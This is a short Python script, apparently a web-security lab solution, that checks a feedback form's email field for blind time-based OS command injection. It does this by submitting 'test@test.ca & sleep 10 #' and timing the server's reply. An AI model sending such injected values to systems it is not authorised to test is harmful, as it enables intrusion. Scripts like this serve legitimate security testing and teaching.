import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session, url):
    feedback_path = "/feedback"
    res = session.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find("input")["value"]
    return csrf

def check_command_injection(session, url):
    submit_feedback_path = "/feedback/submit"
    command_payload = "test@test.ca & sleep 10 #"
    csrf_token = get_csrf_token(session, url)
    params = {'csrf': csrf_token, 'name': 'test', 'email': command_payload, 'subject': 'test', 'message': 'test'}
    res = session.post(url + submit_feedback_path, data=params, verify=False, proxies=proxies)
    if res.elapsed.total_seconds() >= 10.0:
        print("[+] Email field vulnerable to time based command injection!")
    else:
        print("[-] Email field not vulnerable to time based command injection!")
def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: python {sys.argv[0]} <url>")
        print(f"[+] Example: python {sys.argv[0]} www.example.com")
        sys.exit(-1)

    url = sys.argv[1].strip()
    print("[+] Checking  if email parameter is vulnerable to time-based command injection...")
    session = requests.session()
    check_command_injection(session, url)
    
if __name__ == "__main__":
    main()